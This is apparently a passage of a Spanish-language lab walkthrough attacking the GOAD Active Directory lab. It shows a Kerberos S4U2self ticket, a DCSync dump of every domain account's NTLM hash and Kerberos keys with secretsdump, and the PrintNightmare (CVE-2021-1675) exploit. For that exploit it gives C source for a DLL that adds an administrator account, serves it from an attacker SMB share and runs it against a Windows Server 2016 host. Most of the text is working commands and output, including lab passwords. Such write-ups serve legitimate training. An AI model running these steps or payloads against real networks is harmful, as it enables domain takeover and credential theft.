   padata-value=0x6e82051a30820516a003020105a10302010ea20703050000000000a382047c6182047830820474a003020105a11b1b194e4f5254482e534556454e4b494e47444f4d532e4c4f43414ca22e302ca003020101a12530231b066b72627467741b194e4f5254482e534556454e4b494e47444f4d532e4c4f43414ca382041e3082041aa003020112a103020102a282040c048204083767f4fb274cd3df923387216bb582d7410eade9faba01d65506b5a18043bb50c66f30163ac8c64a3c4632117400baed154608eb090611576dc25f03e997fd34d038061dbb69e0fde6466b251fe09167d44bd2f938226c34843ab5d93f8bbdea320be10ccc976b91f584744c682c29490fc56a70539ce6721b1a72cbe91864e3424a02812f4e075f9e176bb994315716e775b35c8bf32a351668087593830e0f22de7eb7047f4a335743123e389d21787d0235ed16a0d8dcc426242fa8c2fa617a72c750c2aec26897ac22bf6daf9dd0175caed5b589dcf3d26203ef40e21da76e57ac72308c0802eaa0653f3afd3673c13db66ddbac6c5e19f15982d6d5d732805e1044d35bc73be6e6834097ecffcd9db1b90a64ce96cba498d30f802b5c49fbc2ad80a76077b863eab8eb827fd526d3b0ca857f7d7f0ebb7adcad3abcd6164369b3dc1b33425fae872209ef564c727cdbe4c4a7dc32f0a977a34b4329bfd9080bb45eca12e510b0775c332547463313f105aff9206729394eb538d96d92fe84d066aa64ea4349d12bbb3641403c629f9fb35e684e84c74da4d70ad4a24df3b8ededa9e1b6ef629e9bbbefd3240dd9141968b5e648913d2f913a5acc3170a1ada0e7a8d397ee06c6a3c28a3e6501264c0d04ccdd51e32009ad171b81880ff1fab4b7d2cb090e3e4a07e7b971069ef23536340f905352bb121ea793bfacf99bd2a40a7a6c351d0eb45c663af4e84b66b881f490f08577b0ad051a8573185cbb5c3091669d7c6ccb94e30d8e8d23f28209ef8bc2b488768bc58cc073b9df7bb6c9c0b3a02211950d2b80ef2777a50886fd0046b2dfd64d07a16063e313a65ce1019d5a3860e463f435c7067fe89943e15e91db060711ad40372136b375e21f05c8ddf1a87813e4b778722f0b5432c868cfdeb6fb97a27b44cd48f2e00274c0d0b6f3bb770d8c51d94aaa16c64750d1926e8a756e575894309c933ed471f50d1b7f04a54a5d7957444cf83f983d420fee77c8cfabc426b4183e3aedb48633743f42958f922ff29476cc6c89f42951059112ca5c6fff4df2fde692305f6e25f31d3cbd958d0721ca1812405dba3f9495aa9d2f6eea9d0d4b1e826b8483a7c13430afbbc14f5dd0ed8d029058c86d1a870445661a5cf2282c836c99533a0149f18d64cfad684c91b8e205bd6455435b804dae9ea7c3cd770f3be5d620a5532b5285708e845f93f1e4e5ca42c573817e67236b7132c2e9a261ba8370edd2e58e852e719dd553fcb11c360add4a23cd24d5235fdd7400c098989300b18192a2ff31df9c9ed994fb1f509d71fda87b98ce117a75308d1d03e453a5ab356e6b8c9ef0cb9b7d1392dc514791cd2a5dd8fc07c539b34114901062ac3f5f2dc90c99d3a0786877955ad61400a604939db22cf7857e5793b528b079886b12606cf415064db9eca79b502d6dd97ea48180307ea003020112a27704753e93110de9232799046654bdb671a3499438c1efaa8fcb029e475a81dcc035af7ff5345a4e02856a23c1f9eecec3ada0f78edb31ddf871d07c344d498708bd31488f2d37549c6ce208c7a03c02c0d5d1f46df581892b8a66bf49664783b3fc4e3136ed3dfaabc832c72a8510dc633ed9718ea2b02a
  PA_DATA:
   padata-type=129
   padata-value=0x3063a01a3018a003020101a111300f1b0d61646d696e6973747261746f72a11b1b196e6f7274682e736576656e6b696e67646f6d732e6c6f63616ca21c301aa0040202ff76a11204103c3f308595b6065d2b16a419264034f1a30a1b084b65726265726f73

 req-body=KDC_REQ_BODY:
  kdc-options=1082195968
  realm=NORTH.SEVENKINGDOMS.LOCAL
  sname=PrincipalName:
   name-type=0
   name-string=SequenceOf:
    winterfell

  till=20230731234822Z
  nonce=1919517027
  etype=SequenceOf:
   18   23

[*] Requesting S4U2self
[+] Trying to connect to KDC at winterfell.north.sevenkingdoms.local:88
[+] Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), automatically filling the substitution service will fail
[+] Original sname is: winterfell
[+] No service realm in new SPN, using the current one (NORTH.SEVENKINGDOMS.LOCAL)
[*] Changing service from winterfell@NORTH.SEVENKINGDOMS.LOCAL to CIFS/winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL
[*] Saving ticket in administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```

Confirmamos que tenemos el ticket

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #ll
Permissions Size User Date Modified Name
.rw-r--r--  1,6k root 30 jul 18:48  administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```

Vamos a realizar el ataque DCSync presentando el ticket de servicio, exportamos este ticket con el comando

`export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #export KRB5CCNAME=/opt/myimpacket/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```

y ya podemos ejecutar la herramienta secretdump con el comando

`secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3cfa564e367dfcea235c723396f0eaf0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NORTH\WINTERFELL$:plain_password_hex:d99c80887714facfb5804bd827a6a937beb654ba5dacd7e7321739dab761f059529c04b2879bf58dbbc7338bbf0c967e473f173e13ecb221a7300eb56bac26f34d7889de27d39fff4d95a4cae244173c414b8f411bdeff7ed89460110b6cde046b64b831ce78d30ed99f13f563ef7e0cc09b0291d271eab1901226ba6d373378d330284e102509db6a580e2b91277b8398c7af89a877ace9f241c6bb61496ca768b929cdd18b12e9853026ccb3034750817d69d63fa79f808a437d8fa8f3324e7400146b5627d9caad3a551aed37e9b1d1ea19a1467674d072909990ccf7a0ad8c6fb9e7eeca4cab026962588ff684fb
NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:0e403cdd0143177b645852aabb7eafb1:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x06a1919a5e8a1f5417573d1abb8e6d79dfc93c68
dpapi_userkey:0x699099362a2151ab74d7520f3e5a3734a578676f
[*] NL$KM 
 0000   22 34 01 76 01 70 30 93  88 A7 6B B2 87 43 59 69   "4.v.p0...k..CYi
 0010   0E 41 BD 22 0A 0C CC 23  3A 5B B6 74 CB 90 D6 35   .A."...#:[.t...5
 0020   14 CA D8 45 4A F0 DB 72  D5 CF 3B A1 ED 7F 3A 98   ...EJ..r..;...:.
 0030   CD 4D D6 36 6A 35 24 2D  A0 EB 0F 8E 3F 52 81 C9   .M.6j5$-....?R..
NL$KM:223401760170309388a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cb40e0977145cf8cf75899742d9f4fb5:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:2c643546d00054420505a2bf86d77c47:::
brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:0e403cdd0143177b645852aabb7eafb1:::
CASTELBLACK$:1104:aad3b435b51404eeaad3b435b51404ee:9c8155e363254749e2b458b64bbd893e:::
samaccount$:1122:aad3b435b51404eeaad3b435b51404ee:0eddedc35eb7b7ecde0c9f0564e54c83:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:2e0f02c39d6203b52c125858b6feb74c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
Administrator:aes128-cts-hmac-sha1-96:bb7b6aed58a7a395e0e674ac76c28aa0
Administrator:des-cbc-md5:fe58cdcd13a43243
krbtgt:aes256-cts-hmac-sha1-96:f9bccb8ea9223e60342fe2f58beadf97384d42621dd05099c1966e49871e22c6
krbtgt:aes128-cts-hmac-sha1-96:d35cbc7409241fe58e5cfe55e1909200
krbtgt:des-cbc-md5:7068c7d6e0da989d
vagrant:aes256-cts-hmac-sha1-96:aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
vagrant:aes128-cts-hmac-sha1-96:0d7c6160ffb016857b9af96c44110ab1
vagrant:des-cbc-md5:16dc9e8ad3dfc47f
arya.stark:aes256-cts-hmac-sha1-96:2001e8fb3da02f3be6945b4cce16e6abdd304974615d6feca7d135d4009d4f7d
arya.stark:aes128-cts-hmac-sha1-96:8477cba28e7d7cfe5338d172a23d74df
arya.stark:des-cbc-md5:13525243d6643285
eddard.stark:aes256-cts-hmac-sha1-96:f6b4d01107eb34c0ecb5f07d804fa9959dce6643f8e4688df17623b847ec7fc4
eddard.stark:aes128-cts-hmac-sha1-96:5f9b06a24b90862367ec221a11f92203
eddard.stark:des-cbc-md5:8067f7abecc7d346
catelyn.stark:aes256-cts-hmac-sha1-96:c8302e270b04252251de40b2bd5fba37395b55d5ed9ac95e03213dc739827283
catelyn.stark:aes128-cts-hmac-sha1-96:50ce7e2ad069fa40fb2bc7f5f9643d93
catelyn.stark:des-cbc-md5:6b314670a2f84cfb
robb.stark:aes256-cts-hmac-sha1-96:d7df5069178bbc93fdc34bbbcb8e374fd75c44d6ce51000f24688925cc4d9c2a
robb.stark:aes128-cts-hmac-sha1-96:b2965905e68356d63fedd9904357cc42
robb.stark:des-cbc-md5:c4b62c797f5dd01f
sansa.stark:aes256-cts-hmac-sha1-96:cd2460a78e8993442498d3f242a88ae110ec6556e40c8add6aab12cfb44b3fa1
sansa.stark:aes128-cts-hmac-sha1-96:18b9d10bd18d1956ba73c14426ec519f
sansa.stark:des-cbc-md5:e66445757c31c176
brandon.stark:aes256-cts-hmac-sha1-96:6dd181186b68898376d3236662f8aeb8fa68e4b5880744034d293d18b6753b10
brandon.stark:aes128-cts-hmac-sha1-96:9de3581a163bd056073b71ab23142d73
brandon.stark:des-cbc-md5:76e61fda8a4f5245
rickon.stark:aes256-cts-hmac-sha1-96:79ffda34e5b23584b3bd67c887629815bb9ab8a1952ae9fda15511996587dcda
rickon.stark:aes128-cts-hmac-sha1-96:d4a0669b1eff6caa42f2632ebca8cd8d
rickon.stark:des-cbc-md5:b9ec3b8f2fd9d98a
hodor:aes256-cts-hmac-sha1-96:a33579ec769f3d6477a98e72102a7f8964f09a745c1191a705d8e1c3ab6e4287
hodor:aes128-cts-hmac-sha1-96:929126dcca8c698230b5787e8f5a5b60
hodor:des-cbc-md5:d5764373f2545dfd
jon.snow:aes256-cts-hmac-sha1-96:5a1bc13364e758131f87a1f37d2f1b1fa8aa7a4be10e3fe5a69e80a5c4c408fb
jon.snow:aes128-cts-hmac-sha1-96:d8bc99ccfebe2d6e97d15f147aa50e8b
jon.snow:des-cbc-md5:084358ceb3290d7c
samwell.tarly:aes256-cts-hmac-sha1-96:b66738c4d2391b0602871d0a5cd1f9add8ff6b91dcbb7bc325dc76986496c605
samwell.tarly:aes128-cts-hmac-sha1-96:3943b4ac630b0294d5a4e8b940101fae
samwell.tarly:des-cbc-md5:5efed0e0a45dd951
jeor.mormont:aes256-cts-hmac-sha1-96:be10f893afa35457fcf61ecc40dc032399b7aee77c87bb71dd2fe91411d2bd50
jeor.mormont:aes128-cts-hmac-sha1-96:1b0a98958e19d6092c8e8dc1d25c788b
jeor.mormont:des-cbc-md5:1a68641a3e9bb6ea
sql_svc:aes256-cts-hmac-sha1-96:24d57467625d5510d6acfddf776264db60a40c934fcf518eacd7916936b1d6af
sql_svc:aes128-cts-hmac-sha1-96:01290f5b76c04e39fb2cb58330a22029
sql_svc:des-cbc-md5:8645d5cd402f16c7
WINTERFELL$:aes256-cts-hmac-sha1-96:a894a5406404d924a314b9a19ceaeb426584d244c23ca2db210293d0bbe741d3
WINTERFELL$:aes128-cts-hmac-sha1-96:d6662f583aa59ef4d7d858df4c1e98cd
WINTERFELL$:des-cbc-md5:3b9294257c94bacd
CASTELBLACK$:aes256-cts-hmac-sha1-96:fadc742c6de4771afc2f2f193910c1511fac0c8a675fa5c8e2eb25e602b4e922
CASTELBLACK$:aes128-cts-hmac-sha1-96:c39ed86facc710737bf65f4eb5ac2331
CASTELBLACK$:des-cbc-md5:f25b6e91cbb9adab
samaccount$:aes256-cts-hmac-sha1-96:7b9a52e2d94aa24dcea3d181001b03380291929a0094fa5b24f44d2a221faa89
samaccount$:aes128-cts-hmac-sha1-96:98c00ce456e342106141609163511daa
samaccount$:des-cbc-md5:f8ab2001bcecc252
SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:e13285e492bd9379476396cb8c9d44c392686b543c552d7b4d81236739c57c39
SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:19ff090bbf17161f9e3fbd21db563c24
SEVENKINGDOMS$:des-cbc-md5:2a4f15dc497f8515
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7ff17da79280>
Traceback (most recent call last):
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/winregistry.py", line 182, in __del__
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/winregistry.py", line 179, in close
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/examples/secretsdump.py", line 358, in close
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smbconnection.py", line 603, in closeFile
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smb3.py", line 1305, in close
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smb3.py", line 423, in sendSMB
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smb3.py", line 392, in signSMB
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/crypto.py", line 148, in AES_CMAC
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7ff17da79280>
Traceback (most recent call last):
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/winregistry.py", line 182, in __del__
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/winregistry.py", line 179, in close
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/examples/secretsdump.py", line 358, in close
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smbconnection.py", line 603, in closeFile
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smb3.py", line 1305, in close
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smb3.py", line 423, in sendSMB
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/smb3.py", line 392, in signSMB
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/impacket/crypto.py", line 148, in AES_CMAC
  File "/opt/myimpacket/myimpacket/lib/python3.9/site-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
```

Y así, tenemos toda la información sobre el dominio norte ntds.dit

por último vamos a limpia, borrando el equipo que hemos creado con el hash de la cuenta de administrador que acabamos de obtener con el comando

`addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'`

```csharp
(myimpacket) ┌─[root@angussmoody]─[/opt/myimpacket]
└──╼ #addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[-] Account samaccountname$ not found in domain NORTH!
```

---

## PrintNightmare Windows Server 2016

Para explotar printnightmare primero comprobaremos si el spooler está activo en los objetivos, esto lo hacemos con el comando `cme smb 192.168.56.10-23 -M spooler` para este ataque utilizaremos las credenciales del usuario jorah.mormont con la contraseña H0nnor!

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.10-23 -M spooler
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SPOOLER     192.168.56.22   445    CASTELBLACK      Spooler service enabled
SPOOLER     192.168.56.10   445    KINGSLANDING     Spooler service enabled
SPOOLER     192.168.56.11   445    WINTERFELL       Spooler service enabled
SPOOLER     192.168.56.23   445    BRAAVOS          Spooler service enabled
SPOOLER     192.168.56.12   445    MEEREEN          Spooler service enabled
Running CME against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Ahora con el comando `rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

Vamos a preparar un archivo dll para realizar la explotación, esto lo vamos a hacer con un archivo llamado nightmare.c aunque podríamos ponerle cualquier nombre, pero para este caso vamos a dejar el que tiene la guía de [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#printnightmare){:target="_blank"} para este ejemplo, modifico el archivo para crear un usuario llamado angussmoody

```c
#include <windows.h> 

int RunCMD()
{
    system("net users angussmoody Passw0rd123. /add");
    system("net localgroup administrators angussmoody /add");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunCMD();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Vamos a compilar el archivo con el comando `x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c 

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll nightmare.dll 
Permissions Size User        Date Modified Name
.rwxrwxrwx   91k angussmoody 15 ago 20:00  nightmare.dll
```

Ahora vamos a clonar el script de cube0x0 que tiene en su [github](https://github.com/cube0x0/CVE-2021-1675){:target="_blank"}  para realizar este ataque, esto lo hacemos con el comando `git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare` una vez termina de correr el comando vemos que tenemos un directorio con el script en python

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
Clonando en 'printnightmare'...
remote: Enumerating objects: 173, done.
remote: Counting objects: 100% (39/39), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 173 (delta 21), reused 17 (delta 17), pack-reused 134
Recibiendo objetos: 100% (173/173), 1.45 MiB | 1.84 MiB/s, listo.
Resolviendo deltas: 100% (63/63), listo.

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll printnightmare/
Permissions Size User        Date Modified Name
.rwxrwxrwx  8,5k angussmoody 15 ago 20:06  CVE-2021-1675.py
drwxrwxrwx     - angussmoody 15 ago 20:06  Images
.rwxrwxrwx  3,7k angussmoody 15 ago 20:06  README.md
drwxrwxrwx     - angussmoody 15 ago 20:06  SharpPrintNightmare
```

vamos a preparar un recurso compartido smb en el directorio donde tenemos el archivo dll, ahora con el comando `smbserver.py -smb2support share .` nos creamos el recurso compartido

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll nightmare.dll 
Permissions Size User        Date Modified Name
.rwxrwxrwx   91k angussmoody 15 ago 20:00  nightmare.dll

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbserver.py -smb2support share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Antes de hacer el ataque vamos a comprobar que el usuario no existe, para este ataque voy a crear un usuario llamado angussmoody con la contraseña Passw0rd123. como lo vimos en el archivo nightmare.c

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb meereen.essos.local -u angussmoody -p 'Passw0rd123.'
SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         essos.local     445    MEEREEN          [-] essos.local\angussmoody:Passw0rd123. STATUS_LOGON_FAILURE
```

Continuamos probando que el script nos corre sin problemas, esto podemos hacerlo con el comando `python3 CVE-2021-1675.py -h` para ver las opciones

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #python3 CVE-2021-1675.py -h
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share [pDriverPath]

MS-RPRN PrintNightmare CVE-2021-1675 / CVE-2021-34527 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'
  pDriverPath           Driver path. Example 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL'

```

ahora que sabemos que el script corre sin problemas, vamos a realizar el ataque contra essos.local que responde a la IP 192.168.56.12 y podemos ver que es un Windows Server 2016 Standard Evaluation 14393 x64

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #cme smb meereen.essos.local
SMB         essos.local     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
```

Corremos el script con el comando `python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.104\share\nightmare.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, vemos que nos dice exploit Completed (Explotación finalizada)

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
└──╼ #python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.104\share\nightmare.dll'
[*] Connecting to ncacn_np:meereen.essos.local[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_e233a12d01c18082\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.56.104\share\nightmare.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Stage2: 0
[+] Exploit Completed
```

también vemos que en nuestro recurso compatido nos realiza una petición desde MEEREEN

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbserver.py -smb2support share .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.56.12,49872)
[*] AUTHENTICATE_MESSAGE (\,MEEREEN)
[*] User MEEREEN\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (192.168.56.12,49872)
[*] Remaining connections []
```

